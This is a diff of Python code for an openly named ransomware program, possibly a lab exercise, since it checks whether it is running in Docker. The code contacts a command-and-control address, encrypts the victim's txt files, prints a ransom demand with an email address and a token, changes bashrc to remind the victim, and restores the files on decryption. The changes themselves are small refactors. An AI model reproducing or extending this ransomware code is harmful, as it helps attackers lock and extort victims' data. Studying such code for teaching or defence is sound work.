@@ -8,7 +8,6 @@ from secret_manager import SecretManager
 from ascii_wonders import *
 
 CNC_ADDRESS = "cnc:6666"
-TOKEN_PATH = "/root/token"
 INSTALL_PATH = "/root/ransomware"
 
 
@@ -16,7 +15,7 @@ class Ransomware:
     def __init__(self) -> None:
         self.check_hostname_is_docker()
         self._log = logging.getLogger(self.__class__.__name__)
-        self._secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        self._secret_manager = SecretManager(CNC_ADDRESS)
 
 
 
@@ -57,6 +56,8 @@ class Ransomware:
         token = self._secret_manager.get_hex_token()
         print(OH_NO)
         print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
+        print(HERE_WIPE_YOUR_TEARS)
+        print(ASCII_TISSUE_BOX)
         return None
     
     def add_reminder_to_bashrc(self, path: str) -> None:
@@ -84,11 +85,9 @@ class Ransomware:
         self._secret_manager.xorfiles(files_to_decrypt)
         self._secret_manager.clean(INSTALL_PATH)
         print("\rOkay, your data has been restored to its former state. Have a nice day :)")
-        print(HERE_WIPE_YOUR_TEARS)
-        print(ASCII_TISSUE_BOX)
 
-        for bashrcbak in self.get_files("*bashrc.bak"):
-            system(f"cp {bashrcbak} {bashrcbak[0:-4]}")
+        for bashrc_bak in self.get_files("*bashrc.bak"):
+            system(f"cp {bashrc_bak} {bashrc_bak[0:-4]}")
 
 
 if __name__ == "__main__":
